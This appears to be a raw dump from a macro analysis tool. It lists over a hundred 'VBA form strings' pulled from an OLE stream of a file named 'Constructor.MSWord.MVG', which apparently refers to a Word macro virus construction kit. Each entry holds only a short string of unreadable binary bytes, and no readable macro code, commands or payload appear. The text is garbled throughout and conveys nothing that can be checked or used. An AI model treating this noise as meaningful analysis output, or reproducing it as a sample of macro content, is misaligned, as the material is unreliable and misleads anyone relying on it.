- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`X �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Pǐ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�`	o@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�罥
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	c�7 0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ף�	$h��"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��[�'?z��oׇ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

4Ȑ Ap
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$"�d�O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�a�a���Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�����Eɛ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,?���Ru�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��.p���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�N\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y
XB�a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a܇�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#.LP���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*vL0��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L@���n@��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\t`0�_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_��x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?M��)Kv+ۮa��T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�N}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z)� (0`�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���l���{	.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"@��
��8r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�lJ��h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��¡̪j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ȑ(�<�0-�,�� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�·H"i�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dq��_R�˴7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b���hVR 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}`�X(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K*�B��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��K��%�@c!J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�
�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ON�����Z*	�Y(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a��1���5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�Z���c��ƚm����n�y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�9śS�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	(��b�)
y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w���n��d"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)@�0�QY��>�&�d�	&�'�y@�O8>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�KÛ[�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\C��&V�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Oj��e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�F��Z61�L2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�E�o��#+Y8�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N~A��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b���	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>b���M:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ʛ��$�jb� �Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T��D՛b9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�pC�h8�:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dt�������@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j:|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a��(+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�1@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2Х����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*��

�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G	���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	(@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 qBH��	L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�AW⵵��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PT���a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X0 C�9@��w�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�YM��g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� $g9Ά�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`C�ꔆ6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,d1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���q�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6`�	�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�.P��@3�A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`|�,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�1�3�p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��HD��y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9BP�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˟�DP����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�:�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0D/$q��ug
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0��-I�Mop�:
@�t��[��A!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��
D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�$"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,D���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~1���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�f\&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ղ\"�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�C(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���$&L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�i�,�+�QR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���P)*s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�&�X(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�הHA`R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɧN�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��$�Vc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b�NʥL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:>�)D�h@P��h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���T\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�V%9f��o�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�LR�7S��ErԒ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

�aH��P��r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l"V�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����F��P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#.$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9RG"���C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�
�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1(�V�2�|Q5�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��OFl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w%Sǹ�I2hc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cX,&�m���E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i�H&2]���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��D��9:X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڱ���a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I�P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���e���t��c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C���tq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�1ME
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�Z���tpL&p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8j�����,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&P���"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5��"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6��r�o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�v�Օ��O�bC?�@��xu�Lm��
-------------------------------------------------------------------------------
